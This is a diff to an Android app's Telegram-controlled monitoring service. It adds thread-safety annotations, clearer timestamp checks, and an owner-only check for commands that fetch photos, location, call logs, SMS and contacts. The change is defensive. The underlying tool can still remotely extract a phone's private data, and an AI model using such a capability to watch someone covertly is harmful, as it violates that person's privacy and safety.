@@ -74,16 +74,26 @@ class MonitoringService : Service() {
     private var initialSyncJob: Job? = null
     private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
+    @Volatile
     private var cachedBotToken = ""
+    @Volatile
     private var cachedChatId = ""
+    @Volatile
     private var cachedOwnerId = 0L
     private var credsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
+    @Volatile
     private var credsCheckAt = 0L
+    @Volatile
     private var netCheckAt = 0L
+    @Volatile
     private var netCached = false
+    @Volatile
     private var cachedCameraInterval = -1
+    @Volatile
     private var cachedMonitoringPaused = false
+    @Volatile
     private var cachedPhotoPausedUntil = 0L
+    @Volatile
     private var cachedSyncInterval = -1
     private var cachedSetupTap: android.app.PendingIntent? = null
 
@@ -93,6 +103,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
+        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -841,9 +852,14 @@ class MonitoringService : Service() {
 
     private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false) {
         val nowSec = System.currentTimeMillis() / 1000L
-        if (sentAtSec > 0 && (nowSec - sentAtSec > COMMAND_MAX_AGE_SEC || sentAtSec - nowSec > 300L)) {
+        if (sentAtSec > 0 && nowSec - sentAtSec > COMMAND_MAX_AGE_SEC) {
             serviceScope.launch {
                 sendToTelegram("\u23F3\uFE0F Command expired, send again.")
+            }
+            return
+        } else if (sentAtSec > 0 && sentAtSec - nowSec > 300L) {
+            serviceScope.launch {
+                sendToTelegram("\u23F3\uFE0F Command timestamp is in the future. Check the device clock, then send again.")
             }
             return
         }
@@ -872,7 +888,7 @@ class MonitoringService : Service() {
                 return
             }
         }
-        if (command in MUTATING_COMMANDS) {
+        if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) {
             if (!senderOk) {
                 sendToTelegram("\u26D4 Only the owner can use $command.")
                 return
